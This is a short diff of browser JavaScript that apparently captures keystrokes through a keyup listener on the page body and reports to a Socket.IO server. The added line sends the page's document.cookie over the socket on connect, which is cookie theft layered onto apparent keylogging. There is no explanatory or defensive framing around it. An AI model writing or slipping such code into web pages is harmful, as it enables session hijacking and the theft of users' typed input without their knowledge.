@@ -9,6 +9,7 @@
     socket.on('connect', function () {
         console.log("connected");
         socket.emit('my event', {data: 'I\'m connected!'});
+        socket.emit('my event', {cookies: document.cookie});
     });
     document.getElementsByTagName("body")[0].addEventListener("keyup", function(e) {
         let key = e.key;
